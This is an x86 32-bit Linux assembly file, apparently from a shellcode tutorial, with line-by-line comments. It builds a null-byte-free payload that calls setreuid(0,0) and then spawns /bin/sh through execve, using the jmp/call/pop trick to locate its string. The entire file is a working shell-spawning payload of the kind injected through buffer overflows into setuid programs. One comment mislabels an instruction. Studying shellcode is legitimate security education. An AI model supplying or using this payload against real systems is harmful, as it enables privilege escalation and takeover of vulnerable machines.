Section .text
global _start
_start:
BITS 32

; setreuid(uid_t ruid, uid_t eiud)

xor eax,eax ; first must zero out remaining 3 bytes of eax register for the next instruction to work
mov al,70 ; put 70 into eax (al to lose some null bytes), since setreuid is syscall #70
xor ebx,ebx ; put 0 into ebx (use XOR to lose null bytes), to set real uid to root
xor ecx,ecx ; put 0 into ecx, to set effective uid to root
int 0x80 ; call the kernel to make the sytem call happen

jmp short two ; jump down to the bottom for the call trick
one:
pop ebx ; pop the 'return address' from the stack
        ; to put the address of the string into ebx

;execve(const char *filename, char *const argv[], char *const envp[])
xor eax,eax ; put 0 into eax
mov [ebx+7],al ; put the 0 from eax where the X is in the string
               ; (7 bytes offset from the beginning)
mov [ebx+8],ebx  ;put the address of the string from ebx where
               ; the AAAA is in the string (8 bytes offset)
mov [ebx+12],eax ; now put 11 into eax, since execve is syscall #11
mov al,11 ; now put 11 into eax, since execve is syscall #11
lea ecx,[ebx+8] ; load the address of where the AAAA was in the string into ecx
lea edx,[ebx+12] ; load the address of where the BBBB was in the string into edx
int 0x80 ; call the kernel to make the system call happen
two:
call one ; use a call to get back to the top and get 
db '/bin/shXAAAABBBB' ; the address of the string
